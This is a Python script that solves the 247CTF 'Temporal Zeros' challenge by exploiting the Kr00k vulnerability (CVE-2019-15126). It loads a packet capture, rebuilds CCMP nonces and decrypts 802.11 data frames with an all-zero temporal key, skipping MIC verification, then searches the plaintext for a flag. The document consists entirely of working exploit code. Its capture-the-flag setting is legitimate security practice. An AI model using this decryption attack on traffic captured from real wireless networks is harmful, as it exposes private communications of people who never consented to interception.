#!/usr/bin/env python3
"""
Kr00k Decryption Script for 247CTF "Temporal Zeros" Challenge
CVE-2019-15126 exploitation
"""

from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11CCMP, Dot11QoS
from Cryptodome.Cipher import AES
import re
import sys

# Kr00k pattern (LLC/SNAP header)
KR00K_PATTERN = b"\xaa\xaa\x03\x00\x00\x00"

# All-zero TK (kr00k vulnerability)
TK = bytes.fromhex("00000000000000000000000000000000")

def kr00k_decrypt(enc_pkt):
    """Decrypt packet using all-zero TK"""
    if not enc_pkt.haslayer(Dot11CCMP):
        return None

    dot11 = enc_pkt[Dot11]
    dot11ccmp = enc_pkt[Dot11CCMP]

    # Extract Packet Number
    PN = "{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}".format(
        dot11ccmp.PN5, dot11ccmp.PN4, dot11ccmp.PN3,
        dot11ccmp.PN2, dot11ccmp.PN1, dot11ccmp.PN0
    )

    # Source MAC
    source_addr = re.sub(':', '', dot11.addr2)

    # QoS TID or 0
    if enc_pkt.haslayer(Dot11QoS):
        tid = "{:01x}".format(enc_pkt[Dot11QoS].TID)
    else:
        tid = '0'
    priority = tid + '0'

    # Build nonce
    ccmp_nonce = bytes.fromhex(priority) + bytes.fromhex(source_addr) + bytes.fromhex(PN)

    # Decrypt without MIC verification
    cipher = AES.new(TK, AES.MODE_CCM, ccmp_nonce, mac_len=8)
    decrypted = cipher.decrypt(dot11ccmp.data[:-8])

    return decrypted

def main():
    if len(sys.argv) < 2:
        pcap_file = "00ps.pcap"
    else:
        pcap_file = sys.argv[1]

    print(f"[*] Loading {pcap_file}...")
    packets = rdpcap(pcap_file)

    print("[*] Attempting kr00k decryption (TK = all zeros)...")
    decrypted_count = 0

    for i, pkt in enumerate(packets):
        if pkt.haslayer(Dot11) and pkt[Dot11].type == 2 and pkt.haslayer(Dot11CCMP):
            dec_data = kr00k_decrypt(pkt)

            if dec_data and dec_data[:6] == KR00K_PATTERN:
                decrypted_count += 1
                print(f"[{i}] Valid decryption: {len(dec_data)} bytes")

                # Check for flag
                if b'CTF' in dec_data or b'flag' in dec_data.lower() or b'247' in dec_data:
                    print(f"\n[!] FLAG FOUND in packet {i}:")
                    # Extract and print flag
                    try:
                        text = dec_data.decode('latin-1')
                        import re as regex
                        flags = regex.findall(r'247CTF\{[a-f0-9]+\}', text)
                        if flags:
                            print(f"    {flags[0]}")
                    except:
                        pass

    print(f"\n[*] Total kr00k-decrypted packets: {decrypted_count}")

if __name__ == "__main__":
    main()
